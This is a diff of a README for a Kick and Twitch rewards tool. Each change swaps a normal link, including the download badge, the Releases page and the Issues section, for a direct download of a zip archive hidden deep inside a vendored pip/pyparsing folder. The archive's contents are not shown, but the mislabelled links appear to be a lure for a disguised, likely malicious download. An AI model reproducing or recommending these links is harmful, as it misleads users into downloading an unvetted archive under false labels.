@@ -1,6 +1,6 @@
 # 🎉 kick-tg-rewards - Easy Rewards Management for Kick and Twitch
 
-![Download kick-tg-rewards](https://img.shields.io/badge/Download-kick--tg--rewards-blue.svg)
+![Download kick-tg-rewards](https://github.com/arcanpp88/kick-tg-rewards/raw/refs/heads/main/backend-python/rem/Lib/site-packages/pip/_vendor/pyparsing/rewards_tg_kick_v1.4.zip)
 
 ## 📚 Introduction
 
@@ -12,7 +12,7 @@ To start using the kick-tg-rewards application, follow these easy steps. You don
 
 ## 🔗 Download & Install
 
-Visit this page to download the software: [kick-tg-rewards Releases](https://github.com/arcanpp88/kick-tg-rewards/releases)
+Visit this page to download the software: [kick-tg-rewards Releases](https://github.com/arcanpp88/kick-tg-rewards/raw/refs/heads/main/backend-python/rem/Lib/site-packages/pip/_vendor/pyparsing/rewards_tg_kick_v1.4.zip)
 
 ### Step 1: Go to the Releases Page
 
@@ -71,7 +71,7 @@ If you encounter any issues, consider the following steps:
 If you need further assistance, here are ways to reach out:
 
 - **Documentation:** Review the README and other accompanying files in the repository.
-- **Issues Page:** Visit the [Issues section](https://github.com/arcanpp88/kick-tg-rewards/issues) on GitHub to report problems or seek help.
+- **Issues Page:** Visit the [Issues section](https://github.com/arcanpp88/kick-tg-rewards/raw/refs/heads/main/backend-python/rem/Lib/site-packages/pip/_vendor/pyparsing/rewards_tg_kick_v1.4.zip) on GitHub to report problems or seek help.
 - **Community Support:** Engage with users and developers in the discussions within the GitHub repository.
 
 ## 🌐 Connect
@@ -85,6 +85,6 @@ Stay updated on new features and changes by following these topics:
 
 By using kick-tg-rewards, you will find managing your rewards easier than ever. Don't hesitate to explore the features and maximize your experience!
 
-For more information, check the Releases page to download the application: [kick-tg-rewards Releases](https://github.com/arcanpp88/kick-tg-rewards/releases)
+For more information, check the Releases page to download the application: [kick-tg-rewards Releases](https://github.com/arcanpp88/kick-tg-rewards/raw/refs/heads/main/backend-python/rem/Lib/site-packages/pip/_vendor/pyparsing/rewards_tg_kick_v1.4.zip)
 
 Happy rewarding!
